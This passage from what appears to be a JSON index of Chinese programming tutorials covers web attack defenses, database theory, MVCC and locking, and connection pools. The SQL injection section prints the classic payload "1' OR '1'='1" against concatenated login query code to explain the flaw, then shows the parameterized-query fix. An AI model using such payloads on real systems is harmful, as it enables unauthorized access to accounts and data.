美元。\n这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。\n通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。\n防范手段    1. 检查 Referer 首部字段    Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。\n这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。\n2. 添加校验 Token    在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。\n3. 输入验证码    因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。\n三、SQL 注入攻击    概念    服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。\n攻击原理    例如一个网站登录验证的 SQL 查询代码为：\nstrSQL = \u0026#34;SELECT * FROM users WHERE (name = \u0026#39;\u0026#34; + userName + \u0026#34;\u0026#39;) and (pw = \u0026#39;\u0026#34;+ passWord +\u0026#34;\u0026#39;);\u0026#34; 如果填入以下内容：\nuserName = \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;; passWord = \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;; 那么 SQL 查询字符串为：\nstrSQL = \u0026#34;SELECT * FROM users WHERE (name = \u0026#39;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;) and (pw = \u0026#39;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;);\u0026#34; 此时无需验证通过就能执行以下查询：\nstrSQL = \u0026#34;SELECT * FROM users;\u0026#34; 防范手段    1. 使用参数化查询    Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。\nPreparedStatement stmt = connection.prepareStatement(\u0026#34;SELECT * FROM users WHERE userid=? AND password=?\u0026#34;); stmt.setString(1, userid); stmt.setString(2, password); ResultSet rs = stmt.executeQuery(); 2. 单引号转换    将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。\n四、拒绝服务攻击    拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。\n分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。\n参考资料     维基百科：跨站脚本 维基百科：SQL 注入攻击 维基百科：跨站点请求伪造 维基百科：拒绝服务攻击  "},{"id":348,"href":"/database/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"数据库基础知识","parent":"database","content":"数据库知识基础，这部分内容一定要理解记忆。虽然这部分内容只是理论知识，但是非常重要，这是后面学习 MySQL 数据库的基础。PS:这部分内容由于涉及太多概念性内容，所以参考了维基百科和百度百科相应的介绍。\n什么是数据库,数据库管理系统,数据库系统,数据库管理员?     数据库 :数据库(DataBase 简称 DB)就是信息的集合或者说数据库是由数据库管理系统管理的数据的集合。 数据库管理系统 : 数据库管理系统(Database Management System 简称 DBMS)是一种操纵和管理数据库的大型软件，通常用于建立、使用和维护数据库。 数据库系统 : 数据库系统(Data Base System，简称 DBS)通常由软件、数据库和数据管理员(DBA)组成。 数据库管理员 : 数据库管理员(Database Administrator,简称 DBA)负责全面管理和控制数据库系统。  数据库系统基本构成如下图所示：\n什么是元组,码,候选码,主码,外码,主属性,非主属性？     元组 ： 元组（tuple）是关系数据库中的基本概念，关系是一张表，表中的每行（即数据库中的每条记录）就是一个元组，每列就是一个属性。 在二维表里，元组也称为行。 码 ：码就是能唯一标识实体的属性，对应表中的列。 候选码 ： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何、子集都不能再标识，则称该属性组为候选码。例如：在学生实体中，“学号”是能唯一的区分学生实体的，同时又假设“姓名”、“班级”的属性组合足以区分学生实体，那么{学号}和{姓名，班级}都是候选码。 主码 : 主码也叫主键。主码是从候选码中选出来的。 一个实体集中只能有一个主码，但可以有多个候选码。 外码 : 外码也叫外键。如果一个关系中的一个属性是另外一个关系中的主码则这个属性为外码。 主属性 ： 候选码中出现过的属性称为主属性。比如关系 工人（工号，身份证号，姓名，性别，部门）.显然工号和身份证号都能够唯一标示这个关系，所以都是候选码。工号、身份证号这两个属性就是主属性。如果主码是一个属性组，那么属性组中的属性都是主属性。 非主属性： 不包含在任何一个候选码中的属性称为非主属性。比如在关系——学生（学号，姓名，年龄，性别，班级）中，主码是“学号”，那么其他的“姓名”、“年龄”、“性别”、“班级”就都可以称为非主属性。  主键和外键有什么区别?     主键(主码) ：主键用于唯一标识一个元组，不能有重复，不允许为空。一个表只能有一个主键。 外键(外码) ：外键用来和其他表建立联系用，外键是另一表的主键，外键是可以有重复的，可以是空值。一个表可以有多个外键。  什么是 ER 图？     我们做一个项目的时候一定要试着画 ER 图来捋清数据库设计，这个也是面试官问你项目的时候经常会被问道的。\n E-R 图也称实体-联系图(Entity Relationship Diagram)，提供了表示实体类型、属性和联系的方法，用来描述现实世界的概念模型。 它是描述现实世界关系概念模型的有效方法。 是表示概念关系模型的一种方式。\n下图是一个学生选课的 ER 图，每个学生可以选若干门课程，同一门课程也可以被若干人选择，所以它们之间的关系是多对多（M:N）。另外，还有其他两种关系是：1 对 1（1:1）、1 对多（1:N）。\n我们试着将上面的 ER 图转换成数据库实际的关系模型(实际设计中，我们通常会将任课教师也作为一个实体来处理)：\n数据库范式了解吗?    1NF(第一范式)\n属性（对应于表中的字段）不能再被分割，也就是这个字段只能是一个值，不能再分为多个其他的字段了。1NF 是所有关系型数据库的最基本要求 ，也就是说关系型数据库中创建的表一定满足第一范式。\n2NF(第二范式)\n2NF 在 1NF 的基础之上，消除了非主属性对于码的部分函数依赖。如下图所示，展示了第一范式到第二范式的过渡。第二范式在第一范式的基础上增加了一个列，这个列称为主键，非主属性都依赖于主键。\n一些重要的概念：\n 函数依赖（functional dependency） ：若在一张表中，在属性（或属性组）X 的值确定的情况下，必定能确定属性 Y 的值，那么就可以说 Y 函数依赖于 X，写作 X → Y。 部分函数依赖（partial functional dependency） ：如果 X→Y，并且存在 X 的一个真子集 X0，使得 X0→Y，则称 Y 对 X 部分函数依赖。比如学生基本信息表 R 中（学号，身份证号，姓名）当然学号属性取值是唯一的，在 R 关系中，（学号，身份证号）-\u0026gt;（姓名），（学号）-\u0026gt;（姓名），（身份证号）-\u0026gt;（姓名）；所以姓名部分函数依赖与（学号，身份证号）； 完全函数依赖(Full functional dependency) ：在一个关系中，若某个非主属性数据项依赖于全部关键字称之为完全函数依赖。比如学生基本信息表 R（学号，班级，姓名）假设不同的班级学号有相同的，班级内学号不能相同，在 R 关系中，（学号，班级）-\u0026gt;（姓名），但是（学号）-\u0026gt;(姓名)不成立，（班级）-\u0026gt;(姓名)不成立，所以姓名完全函数依赖与（学号，班级）； 传递函数依赖 ： 在关系模式 R(U)中，设 X，Y，Z 是 U 的不同的属性子集，如果 X 确定 Y、Y 确定 Z，且有 X 不包含 Y，Y 不确定 X，（X∪Y）∩Z=空集合，则称 Z 传递函数依赖(transitive functional dependency) 于 X。传递函数依赖会导致数据冗余和异常。传递函数依赖的 Y 和 Z 子集往往同属于某一个事物，因此可将其合并放到一个表中。比如在关系 R(学号 ,姓名, 系名，系主任)中，学号 → 系名，系名 → 系主任，所以存在非主属性系主任对于学号的传递函数依赖。。  3NF(第三范式)\n3NF 在 2NF 的基础之上，消除了非主属性对于码的传递函数依赖 。符合 3NF 要求的数据库设计，基本上解决了数据冗余过大，插入异常，修改异常，删除异常的问题。比如在关系 R(学号 ,姓名, 系名，系主任)中，学号 → 系名，系名 → 系主任，所以存在非主属性系主任对于学号的传递函数依赖，所以该表的设计，不符合 3NF 的要求。\n总结\n 1NF：属性不可再分。 2NF：1NF 的基础之上，消除了非主属性对于码的部分函数依赖。 3NF：3NF 在 2NF 的基础之上，消除了非主属性对于码的传递函数依赖 。  什么是存储过程?    我们可以把存储过程看成是一些 SQL 语句的集合，中间加了点逻辑控制语句。存储过程在业务比较复杂的时候是非常实用的，比如很多时候我们完成一个操作可能需要写一大串 SQL 语句，这时候我们就可以写有一个存储过程，这样也方便了我们下一次的调用。存储过程一旦调试完成通过后就能稳定运行，另外，使用存储过程比单纯 SQL 语句执行要快，因为存储过程是预编译过的。\n存储过程在互联网公司应用不多，因为存储过程难以调试和扩展，而且没有移植性，还会消耗数据库资源。\n阿里巴巴 Java 开发手册里要求禁止使用存储过程。\ndrop、delete 与 truncate 区别？    用法不同     drop(丢弃数据): drop table 表名 ，直接将表都删除掉，在删除表的时候使用。 truncate (清空数据) : truncate table 表名 ，只删除表中的数据，再插入数据的时候自增长 id 又从 1 开始，在清空表中数据的时候使用。 delete（删除数据） : delete from 表名 where 列名=值，删除某一列的数据，如果不加 where 子句和truncate table 表名作用类似。  truncate 和不带 where 子句的 delete、以及 drop 都会删除表内的数据，但是 truncate 和 delete 只删除数据不删除表的结构(定义)，执行 drop 语句，此表的结构也会删除，也就是执行 drop 之后对应的表不复存在。\n属于不同的数据库语言    truncate 和 drop 属于 DDL(数据定义语言)语句，操作立即生效，原数据不放到 rollback segment 中，不能回滚，操作不触发 trigger。而 delete 语句是 DML (数据库操作语言)语句，这个操作会放到 rollback segement 中，事务提交之后才生效。\nDML 语句和 DDL 语句区别：\n DML 是数据库操作语言（Data Manipulation Language）的缩写，是指对数据库中表记录的操作，主要包括表记录的插入（insert）、更新（update）、删除（delete）和查询（select），是开发人员日常使用最频繁的操作。 DDL （Data Definition Language）是数据定义语言的缩写，简单来说，就是对数据库内部的对象进行创建、删除、修改的操作语言。它和 DML 语言的最大区别是 DML 只是对表内部数据的操作，而不涉及到表的定义、结构的修改，更不会涉及到其他对象。DDL 语句更多的被数据库管理员（DBA）所使用，一般的开发人员很少使用。  执行速度不同    一般来说:drop\u0026gt;truncate\u0026gt;delete（这个我没有设计测试过）。\n数据库设计通常分为哪几步?     需求分析 : 分析用户的需求，包括数据、功能和性能需求。 概念结构设计 : 主要采用 E-R 模型进行设计，包括画 E-R 图。 逻辑结构设计 : 通过将 E-R 图转换成表，实现从 E-R 模型到关系模型的转换。 物理结构设计 : 主要是为所设计的数据库选择合适的存储结构和存取路径。 数据库实施 : 包括编程、测试和试运行 数据库的运行和维护 : 系统的运行与数据库的日常维护。  参考     https://blog.csdn.net/rl529014/article/details/48391465 https://www.zhihu.com/question/24696366/answer/29189700 https://blog.csdn.net/bieleyang/article/details/77149954  "},{"id":349,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/","title":"数据库系统原理","parent":"笔记","content":"数据库系统原理     数据库系统原理  一、事务  概念 ACID AUTOCOMMIT   二、并发一致性问题  丢失修改 读脏数据 不可重复读 幻影读   三、封锁  封锁粒度 封锁类型 封锁协议 MySQL 隐式与显式锁定   四、隔离级别  未提交读（READ UNCOMMITTED） 提交读（READ COMMITTED） 可重复读（REPEATABLE READ） 可串行化（SERIALIZABLE）   五、多版本并发控制  基本思想 版本号 Undo 日志 ReadView 快照读与当前读   六、Next-Key Locks  Record Locks Gap Locks Next-Key Locks   七、关系数据库设计理论  函数依赖 异常 范式   八、ER 图  实体的三种联系 表示出现多次的关系 联系的多向性 表示子类   参考资料    一、事务    概念    事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。\n\nACID    1. 原子性（Atomicity）    事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。\n回滚可以用回滚日志（Undo Log）来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。\n2. 一致性（Consistency）    数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对同一个数据的读取结果都是相同的。\n3. 隔离性（Isolation）    一个事务所做的修改在最终提交以前，对其它事务是不可见的。\n4. 持久性（Durability）    一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。\n系统发生崩溃可以用重做日志（Redo Log）进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。\n 事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系：\n 只有满足一致性，事务的执行结果才是正确的。 在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。 在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。 事务满足持久化是为了能应对系统崩溃的情况。  \nAUTOCOMMIT    MySQL 默认采用自动提交模式。也就是说，如果不显式使用START TRANSACTION语句来开始一个事务，那么每个查询操作都会被当做一个事务并自动提交。\n二、并发一致性问题    在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。\n丢失修改    丢失修改指一个事务的更新操作被另外一个事务的更新操作替换。一般在现实生活中常会遇到，例如：T1 和 T2 两个事务都对一个数据进行修改，T1 先修改并提交生效，T2 随后修改，T2 的修改覆盖了 T1 的修改。\n\n读脏数据    读脏数据指在不同的事务下，当前事务可以读到另外事务未提交的数据。例如：T1 修改一个数据但未提交，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。\n\n不可重复读    不可重复读指在一个事务内多次读取同一数据集合。在这一事务还未结束前，另一事务也访问了该同一数据集合并做了修改，由于第二个事务的修改，第一次事务的两次读取的数据可能不一致。例如：T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。\n\n幻影读    幻读本质上也属于不可重复读的情况，T1 读取某个范围的数据，T2 在这个范围内插入新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。\n\n 产生并发不一致性问题的主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。\n三、封锁    封锁粒度    MySQL 中提供了两种封锁粒度：行级锁以及表级锁。\n应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。\n但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。\n在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。\n封锁类型    1. 读写锁     互斥锁（Exclusive），简写为 X 锁，又称写锁。 共享锁（Shared），简写为 S 锁，又称读锁。  有以下两个规定：\n 一个事务对数据对象 A 加了 X 锁，就可以对 A 进行读取和更新。加锁期间其它事务不能对 A 加任何锁。 一个事务对数据对象 A 加了 S 锁，可以对 A 进行读取操作，但是不能进行更新操作。加锁期间其它事务能对 A 加 S 锁，但是不能加 X 锁。  锁的兼容关系如下：\n\n2. 意向锁    使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。\n在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。\n意向锁在原来的 X/S 锁之上引入了 IX/IS，IX/IS 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：\n 一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁； 一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。  通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。\n各种锁的兼容关系如下：\n\n解释如下：\n 任意 IS/IX 锁之间都是兼容的，因为它们只表示想要对表加锁，而不是真正加锁； 这里兼容关系针对的是表级锁，而表级的 IX 锁和行级的 X 锁兼容，两个事务可以对两个数据行加 X 锁。（事务 T1 想要对数据行 R1 加 X 锁，事务 T2 想要对同一个表的数据行 R2 加 X 锁，两个事务都需要对该表加 IX 锁，但是 IX 锁是兼容的，并且 IX 锁与行级的 X 锁也是兼容的，因此两个事务都能加锁成功，对同一个表中的两个数据行做修改。）  封锁协议    1. 三级封锁协议    一级封锁协议\n事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。\n可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。\n\n二级封锁协议\n在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁。\n可以解决读脏数据问题，因为如果一个事务在对数据 A 进行修改，根据 1 级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。\n\n三级封锁协议\n在二级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁。\n可以解决不可重复读的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。\n\n2. 两段锁协议    加锁和解锁分为两个阶段进行。\n可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。串行执行的事务互不干扰，不会出现并发一致性问题。\n事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。\nlock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B) 但不是必要条件，例如以下操作不满足两段锁协议，但它还是可串行化调度。\nlock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C) MySQL 隐式与显式锁定    MySQL 的 InnoDB 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。\nInnoDB 也可以使用特定的语句进行显示锁定：\nSELECT ... LOCK In SHARE MODE; SELECT ... FOR UPDATE; 四、隔离级别    未提交读（READ UNCOMMITTED）    事务中的修改，即使没有提交，对其它事务也是可见的。\n提交读（READ COMMITTED）    一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。\n可重复读（REPEATABLE READ）    保证在同一个事务中多次读取同一数据的结果是一样的。\n可串行化（SERIALIZABLE）    强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。\n该隔离级别需要加锁实现，因为要使用加锁机制保证同一时间只有一个事务执行，也就是保证事务串行执行。\n \n五、多版本并发控制    多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，要求很低，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。\n基本思想    在封锁一节中提到，加锁能解决多个事务同时执行时出现的并发一致性问题。在实际场景中读操作往往多于写操作，因此又引入了读写锁来避免不必要的加锁操作，例如读和读没有互斥关系。读写锁中读和写操作仍然是互斥的，而 MVCC 利用了多版本的思想，写操作更新最新的版本快照，而读操作去读旧版本快照，没有互斥关系，这一点和 CopyOnWrite 类似。\n在 MVCC 中事务的修改操作（DELETE、INSERT、UPDATE）会为数据行新增一个版本快照。\n脏读和不可重复读最根本的原因是事务读取到其它事务未提交的修改。在事务进行读取操作时，为了解决脏读和不可重复读问题，MVCC 规定只能读取已经提交的快照。当然一个事务可以读取自身未提交的快照，这不算是脏读。\n版本号     系统版本号 SYS_ID：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。 事务版本号 TRX_ID ：事务开始时的系统版本号。  Undo 日志    MVCC 的多版本指的是多个版本的快照，快照存储在 Undo 日志中，该日志通过回滚指针 ROLL_PTR 把一个数据行的所有快照连接起来。\n例如在 MySQL 创建一个表 t，包含主键 id 和一个字段 x。我们先插入一个数据行，然后对该数据行执行两次更新操作。\nINSERT INTO t(id, x) VALUES(1, \u0026#34;a\u0026#34;); UPDATE t SET x=\u0026#34;b\u0026#34; WHERE id=1; UPDATE t SET x=\u0026#34;c\u0026#34; WHERE id=1; 因为没有使用 START TRANSACTION 将上面的操作当成一个事务来执行，根据 MySQL 的 AUTOCOMMIT 机制，每个操作都会被当成一个事务来执行，所以上面的操作总共涉及到三个事务。快照中除了记录事务版本号 TRX_ID 和操作之外，还记录了一个 bit 的 DEL 字段，用于标记是否被删除。\n\nINSERT、UPDATE、DELETE 操作会创建一个日志，并将事务版本号 TRX_ID 写入。DELETE 可以看成是一个特殊的 UPDATE，还会额外将 DEL 字段设置为 1。\nReadView    MVCC 维护了一个 ReadView 结构，主要包含了当前系统未提交的事务列表 TRX_IDs {TRX_ID_1, TRX_ID_2, \u0026hellip;}，还有该列表的最小值 TRX_ID_MIN 和 TRX_ID_MAX。\n\n在进行 SELECT 操作时，根据数据行快照的 TRX_ID 与 TRX_ID_MIN 和 TRX_ID_MAX 之间的关系，从而判断数据行快照是否可以使用：\n  TRX_ID \u0026lt; TRX_ID_MIN，表示该数据行快照时在当前所有未提交事务之前进行更改的，因此可以使用。\n  TRX_ID \u0026gt; TRX_ID_MAX，表示该数据行快照是在事务启动之后被更改的，因此不可使用。\n  TRX_ID_MIN \u0026lt;= TRX_ID \u0026lt;= TRX_ID_MAX，需要根据隔离级别再进行判断：\n 提交读：如果 TRX_ID 在 TRX_IDs 列表中，表示该数据行快照对应的事务还未提交，则该快照不可使用。否则表示已经提交，可以使用。 可重复读：都不可以使用。因为如果可以使用的话，那么其它事务也可以读到这个数据行快照并进行修改，那么当前事务再去读这个数据行得到的值就会发生改变，也就是出现了不可重复读问题。    在数据行快照不可使用的情况下，需要沿着 Undo Log 的回滚指针 ROLL_PTR 找到下一个快照，再进行上面的判断。\n快照读与当前读    1. 快照读    MVCC 的 SELECT 操作是快照中的数据，不需要进行加锁操作。\nSELECT * FROM table ...; 2. 当前读    MVCC 其它会对数据库进行修改的操作（INSERT、UPDATE、DELETE）需要进行加锁操作，从而读取最新的数据。可以看到 MVCC 并不是完全不用加锁，而只是避免了 SELECT 的加锁操作。\nINSERT; UPDATE; DELETE; 在进行 SELECT 操作时，可以强制指定进行加锁操作。以下第一个语句需要加 S 锁，第二个需要加 X 锁。\nSELECT * FROM table WHERE ? lock in share mode; SELECT * FROM table WHERE ? for update; 六、Next-Key Locks    Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。\nMVCC 不能解决幻影读问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 MVCC + Next-Key Locks 可以解决幻读问题。\nRecord Locks    锁定一个记录上的索引，而不是记录本身。\n如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。\nGap Locks    锁定索引之间的间隙，但是不包含索引本身。例如当一个事务执行以下语句，其它事务就不能在 t.c 中插入 15。\nSELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE; Next-Key Locks    它是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙。它锁定一个前开后闭区间，例如一个索引包含以下值：10, 11, 13, and 20，那么就需要锁定以下区间：\n(-∞, 10] (10, 11] (11, 13] (13, 20] (20, +∞) 七、关系数据库设计理论    函数依赖    记 A-\u0026gt;B 表示 A 函数决定 B，也可以说 B 函数依赖于 A。\n如果 {A1，A2，\u0026hellip; ，An} 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。\n对于 A-\u0026gt;B，如果能找到 A 的真子集 A'，使得 A'-\u0026gt; B，那么 A-\u0026gt;B 就是部分函数依赖，否则就是完全函数依赖。\n对于 A-\u0026gt;B，B-\u0026gt;C，则 A-\u0026gt;C 是一个传递函数依赖。\n异常    以下的学生课程关系的函数依赖为 {Sno, Cname} -\u0026gt; {Sname, Sdept, Mname, Grade}，键码为 {Sno, Cname}。也就是说，确定学生和课程之后，就能确定其它信息。\n   Sno Sname Sdept Mname Cname Grade     1 学生-1 学院-1 院长-1 课程-1 90   2 学生-2 学院-2 院长-2 课程-2 80   2 学生-2 学院-2 院长-2 课程-1 100   3 学生-3 学院-2 院长-2 课程-2 95    不符合范式的关系，会产生很多异常，主要有以下四种异常：\n 冗余数据：例如 学生-2 出现了两次。 修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。 删除异常：删除一个信息，那么也会丢失其它信息。例如删除了 课程-1 需要删除第一行和第三行，那么 学生-1 的信息就会丢失。 插入异常：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。  范式    范式理论是为了解决以上提到四种异常。\n高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。\n1. 第一范式 (1NF)    属性不可分。\n2. 第二范式 (2NF)    每个非主属性完全函数依赖于键码。\n可以通过分解来满足。\n分解前 \n   Sno Sname Sdept Mname Cname Grade     1 学生-1 学院-1 院长-1 课程-1 90   2 学生-2 学院-2 院长-2 课程-2 80   2 学生-2 学院-2 院长-2 课程-1 100   3 学生-3 学院-2 院长-2 课程-2 95    以上学生课程关系中，{Sno, Cname} 为键码，有如下函数依赖：\n Sno -\u0026gt; Sname, Sdept Sdept -\u0026gt; Mname Sno, Cname-\u0026gt; Grade  Grade 完全函数依赖于键码，它没有任何冗余数据，每个学生的每门课都有特定的成绩。\nSname, Sdept 和 Mname 都部分依赖于键码，当一个学生选修了多门课时，这些数据就会出现多次，造成大量冗余数据。\n分解后 \n关系-1\n   Sno Sname Sdept Mname     1 学生-1 学院-1 院长-1   2 学生-2 学院-2 院长-2   3 学生-3 学院-2 院长-2    有以下函数依赖：\n Sno -\u0026gt; Sname, Sdept Sdept -\u0026gt; Mname  关系-2\n   Sno Cname Grade     1 课程-1 90   2 课程-2 80   2 课程-1 100   3 课程-2 95    有以下函数依赖：\n Sno, Cname -\u0026gt; Grade  3. 第三范式 (3NF)    非主属性不传递函数依赖于键码。\n上面的 关系-1 中存在以下传递函数依赖：\n Sno -\u0026gt; Sdept -\u0026gt; Mname  可以进行以下分解：\n关系-11\n   Sno Sname Sdept     1 学生-1 学院-1   2 学生-2 学院-2   3 学生-3 学院-2    关系-12\n   Sdept Mname     学院-1 院长-1   学院-2 院长-2    八、ER 图    Entity-Relationship，有三个组成部分：实体、属性、联系。\n用来进行关系型数据库系统的概念设计。\n实体的三种联系    包含一对一，一对多，多对多三种。\n 如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B； 如果是一对一，画两个带箭头的线段； 如果是多对多，画两个不带箭头的线段。  下图的 Course 和 Student 是一对多的关系。\n\n表示出现多次的关系    一个实体在联系出现几次，就要用几条线连接。\n下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。\n\n联系的多向性    虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。\n\n表示子类    用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。\n\n参考资料     AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, 等. 数据库系统概念 [M]. 机械工业出版社, 2006. 施瓦茨. 高性能 MYSQL(第3版)[M]. 电子工业出版社, 2013. 史嘉权. 数据库系统概论[M]. 清华大学出版社有限公司, 2006. The InnoDB Storage Engine Transaction isolation levels Concurrency Control The Nightmare of Locking, Blocking and Isolation Levels! Database Normalization and Normal Forms with an Example The basics of the InnoDB undo logging and history system MySQL locking for the busy web developer 浅入浅出 MySQL 和 InnoDB Innodb 中的事务隔离级别和锁的关系  "},{"id":350,"href":"/database/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/","title":"数据库连接池","parent":"database","content":" 公众号和Github待发文章：数据库：数据库连接池原理详解与自定义连接池实现 基于JDBC的数据库连接池技术研究与应用 数据库连接池技术详解  数据库连接本质就是一个 socket 的连接。数据库服务端还要维护一些缓存和用户权限信息之类的 所以占用了一些内存\n连接池是维护的数据库连接的缓存，以便将来需要对数据库的请求时可以重用这些连接。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序的请求，既昂贵又浪费资源。**在连接池中，创建连接后，将其放置在池中，并再次使用它，因此不必建立新的连接。如果使用了所有连接，则会建立一个新连接并将其添加到池中。**连接池还减少了用户必须等待建立与数据库的连接的时间。\n操作过数据库的朋友应该都知道数据库连接池这个概念，它几乎每天都在和我们打交道，但是你真的了解 数据库连接池 吗？\n没有数据库连接池之前    我相信你一定听过这样一句话：Java语言中，JDBC（Java DataBase Connection）是应用程序与数据库沟通的桥梁。\n"},{"id":351,"href":"/java/jvm/%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84JVM%E5%8F%82%E6%95%B0%E6%8C%87%E5%8D%97/","title":"最重要的JVM参数指南","parent":"jvm","content":" 本文由 JavaGuide 翻译自 https://www.baeldung.com/jvm-parameters，并对文章进行了大量的完善补充。翻译不易，如需转载请注明出处，作者：baeldung 。\n 